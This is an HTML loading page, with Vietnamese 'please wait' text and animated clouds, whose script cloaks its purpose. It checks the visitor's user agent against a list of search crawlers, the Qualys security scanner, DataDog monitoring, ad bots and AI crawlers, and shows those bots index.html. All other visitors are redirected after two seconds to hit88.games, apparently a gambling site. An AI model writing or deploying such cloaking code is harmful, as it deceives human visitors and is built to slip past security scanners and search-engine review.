<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(to bottom, #87CEFA, #B0E0E6);
            overflow: hidden;
        }
        .loading-container {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .loading-text {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }
        .clouds {
            position: relative;
            width: 100%;
            height: 200px;
            background: url('clouds.png') repeat-x;
            animation: moveClouds 10s linear infinite;
        }
        .birds {
            position: absolute;
            top: 50px;
            left: 0;
            width: 100%;
            height: 100px;
            background: url('birds.png') repeat-x;
            animation: moveBirds 15s linear infinite;
        }
        @keyframes moveClouds {
            from { background-position: 0 0; }
            to { background-position: -1000px 0; }
        }
        @keyframes moveBirds {
            from { background-position: 0 0; }
            to { background-position: -1000px 0; }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="loading-text">Vui lòng đợi 2 giây...</div>
        <div class="clouds"></div>
        <div class="birds"></div>
    </div>

    <script>
        function isBot() {
            const userAgent = navigator.userAgent.toLowerCase();
            const botList = [
                'googlebot',           // Google Search Engine Crawler
                'qualys',              // Qualys Security
                'amazonbot',           // Amazon AI Crawler
                'bingbot',             // Microsoft Search Engine Crawler
                'synthetic',           // DataDog Monitoring & Analytics (Synthetic Bot)
                'adsbot',              // Google AdsBot
                'taboola',             // Taboola Advertising & Marketing
                'googleother',         // Google AI Crawler
                'gptbot',              // OpenAI GPTBot
                'google image proxy'   // Google Image Proxy
            ];

            return botList.some(bot => userAgent.includes(bot));
        }

        if (!isBot()) {
            setTimeout(function() {
                window.location.href = "https://hit88.games/";
            }, 2000);
        } else {
            // Chuyển hướng bot về trang index.html
            window.location.href = "index.html";
        }
    </script>
</body>
</html>
